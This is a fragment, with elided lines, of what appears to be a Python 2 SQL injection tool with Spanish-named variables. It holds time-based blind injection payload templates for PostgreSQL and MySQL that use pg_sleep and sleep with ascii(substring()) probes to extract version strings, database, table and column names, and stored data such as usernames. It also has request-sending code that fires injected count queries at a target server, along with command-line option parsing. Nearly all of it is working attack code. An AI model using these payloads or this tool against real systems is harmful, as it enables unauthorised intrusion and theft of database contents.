...
#		'version':["'and IF(ascii(substring((SELECT username from user where id = 1),1,1))>1,sleep(10),0)=0-- -+" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(1),0)=0","-- -+"],
	...
	catalogoPostgresBlind={
		'version':["lol 1" , "';" , "select case when(ascii(substring((select version())," , "))" , "-- -+", "", "", ") then pg_sleep(#) ELSE 'E' END"],
		'bases':["lol" , "';" , "select case when(ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+","","",") then pg_sleep(#) ELSE 'E' END"],
		'current':["' and   ascii(substring((SELECT current_database()),1,1))" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(#) ELSE 'E' END"],
		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) ELSE 'E' END"],
		'columnas':["';" , " select case when(ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) ELSE 'E' END"],
		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(#) ELSE 'E' END"],
		'manejador':["pgsql"]
					...
					while char == "No encontrado" and bandera != 1:
						...
						if where != '' and table != '' and columna != '':
							...
							if tipo == "mysql" and obj.based == "error":
								...
								while count.text != pagCont.text and count.elapsed.seconds != 1:
									count = requests.get(url=obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
									limite = limite +1
...
# 				print "tautosidad:"+tautosidad.text
# 				print "tautosidad2:"+tautosidad2.text
...
def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy=","based=","time="])
	except GetoptError:
